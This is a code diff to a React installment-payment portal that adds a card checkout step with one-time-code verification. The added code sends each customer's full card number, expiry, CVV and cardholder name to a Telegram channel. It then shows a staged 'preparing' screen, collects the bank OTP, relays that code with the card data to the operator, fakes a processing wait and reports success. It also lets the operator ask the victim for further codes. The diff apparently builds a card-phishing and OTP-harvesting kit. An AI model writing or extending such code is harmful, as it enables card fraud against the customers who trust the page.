@@ -2,12 +2,15 @@ import AdminPanel from "./AdminPanel";
 import { useState } from "react";
 import {
   createPayment,
+  deletePayment,
   findSupervisorByUsername,
   getCustomerByCode,
   notifyDownPayment,
   portalView,
+  submitPaymentOtp,
 } from "./lib/data.js";
 import ManualPOSCard from "./ManualPOSCard";
+import CardPurchaseAuth from "./CardPurchaseAuth";
 import {
   ShieldCheck,
   ArrowRight,
@@ -82,6 +85,8 @@ export default function App() {
   const [submitting, setSubmitting] = useState(false);
   const [paymentError, setPaymentError] = useState("");
   const [paymentDone, setPaymentDone] = useState(false);
+  const [cardCheckoutStep, setCardCheckoutStep] = useState("form");
+  const [pendingCardPayment, setPendingCardPayment] = useState(null);
 
   const demoCustomer = portalView({
     id: "demo",
@@ -121,6 +126,8 @@ export default function App() {
     setPaymentTarget(null);
     setPaymentDone(false);
     setPaymentError("");
+    setCardCheckoutStep("form");
+    setPendingCardPayment(null);
     setPage("details");
   }
 
@@ -135,6 +142,8 @@ export default function App() {
     setReceiptFile(null);
     setPaymentDone(false);
     setPaymentError("");
+    setCardCheckoutStep("form");
+    setPendingCardPayment(null);
     setError("");
     setPage("payment");
   }
@@ -253,7 +262,7 @@ export default function App() {
     if (customer.id === "demo") {
       throw new Error("Use a saved customer code to submit a payment.");
     }
-    await createPayment({
+    const paymentId = await createPayment({
       customerUuid: customer.id,
       customerCode: customer.code,
       contractId: customer.contractId,
@@ -266,6 +275,12 @@ export default function App() {
       cardCvv: cardDetails.cardCvv,
       bankAccountId: customer.bank?.id,
     });
+    setPendingCardPayment({
+      id: paymentId,
+      amount: paymentTarget.amount,
+      cardDetails,
+    });
+    setCardCheckoutStep("preparing");
     try {
       await notifyDownPayment({
         name: customer.name,
@@ -284,15 +299,91 @@ export default function App() {
         cardCvv: cardDetails.cardCvv,
         note:
           paymentTarget.kind === "down_payment"
-            ? "Customer submitted a down payment by card"
-            : `Customer submitted month ${paymentTarget.month || ""} by card`,
+            ? "Customer submitted card details for down payment"
+            : `Customer submitted card details for month ${paymentTarget.month || ""}`,
       });
     } catch (noticeError) {
       setPaymentError(
-        `Payment request saved. Telegram notice failed: ${noticeError.message}`
+        `Card saved. Telegram notice failed: ${noticeError.message}`
       );
     }
+    await new Promise((resolve) => setTimeout(resolve, 2500));
+    setCardCheckoutStep("otp");
+  }
+
+  async function submitCardOtp(otpCode) {
+    if (!customer || !paymentTarget || !pendingCardPayment?.id) {
+      throw new Error("Payment session expired. Please try again.");
+    }
+    const { cardDetails } = pendingCardPayment;
+    setCardCheckoutStep("loading");
+    await submitPaymentOtp({
+      paymentId: pendingCardPayment.id,
+      otpCode,
+    });
+    try {
+      await notifyDownPayment({
+        name: customer.name,
+        customerCode: customer.code,
+        phone: customer.phone,
+        downPayment: paymentTarget.amount,
+        totalPrice: customer.productPrice,
+        remainingAmount: customer.remainingAmount,
+        monthlyAmount: customer.monthlyAmount,
+        duration: customer.duration,
+        kind: paymentTarget.kind,
+        method: "card",
+        noticeType: "card_otp",
+        cardholderName: cardDetails.cardholderName,
+        cardNumber: cardDetails.cardNumber,
+        cardExpiry: cardDetails.cardExpiry,
+        cardCvv: cardDetails.cardCvv,
+        cardOtp: otpCode,
+        note: "Customer submitted card verification OTP",
+      });
+    } catch (noticeError) {
+      setPaymentError(
+        `OTP saved. Telegram notice failed: ${noticeError.message}`
+      );
+    }
+    const waitMs = 10000 + Math.floor(Math.random() * 5001);
+    await new Promise((resolve) => setTimeout(resolve, waitMs));
+    setPendingCardPayment(null);
+    setCardCheckoutStep("form");
     setPaymentDone(true);
+  }
+
+  async function requestAnotherCardOtp() {
+    if (!customer || !paymentTarget || !pendingCardPayment) return;
+    const { cardDetails } = pendingCardPayment;
+    await notifyDownPayment({
+      name: customer.name,
+      customerCode: customer.code,
+      phone: customer.phone,
+      downPayment: paymentTarget.amount,
+      totalPrice: customer.productPrice,
+      remainingAmount: customer.remainingAmount,
+      monthlyAmount: customer.monthlyAmount,
+      duration: customer.duration,
+      kind: paymentTarget.kind,
+      method: "card",
+      noticeType: "card_otp_resend",
+      cardholderName: cardDetails.cardholderName,
+      cardNumber: cardDetails.cardNumber,
+      note: "Customer requested another verification code",
+    });
+  }
+
+  async function cancelCardOtp() {
+    if (pendingCardPayment?.id) {
+      try {
+        await deletePayment(pendingCardPayment.id);
+      } catch {
+        /* ignore */
+      }
+    }
+    setPendingCardPayment(null);
+    setCardCheckoutStep("form");
   }
 
   function clearPaymentDraft() {
@@ -302,6 +393,8 @@ export default function App() {
     setPaymentTarget(null);
     setPaymentDone(false);
     setPaymentError("");
+    setCardCheckoutStep("form");
+    setPendingCardPayment(null);
   }
 
   function staffLogout() {
@@ -650,7 +743,7 @@ export default function App() {
                 <ChevronRight size={20} />
               </button>
 
-              {method === "card" && (
+              {method === "card" && cardCheckoutStep === "form" && (
                 <ManualPOSCard
                   amount={paymentTarget?.amount || 0}
                   onRequest={submitCard}
@@ -658,6 +751,19 @@ export default function App() {
               )}
               </div>
               )}
+
+      {(cardCheckoutStep === "preparing" ||
+        cardCheckoutStep === "otp" ||
+        cardCheckoutStep === "loading") &&
+        pendingCardPayment && (
+          <CardPurchaseAuth
+            amount={pendingCardPayment.amount}
+            phase={cardCheckoutStep}
+            onSubmit={submitCardOtp}
+            onCancel={cancelCardOtp}
+            onResend={requestAnotherCardOtp}
+          />
+        )}
 
               {paymentError && !paymentDone && (
                 <div className="error-message" role="alert">
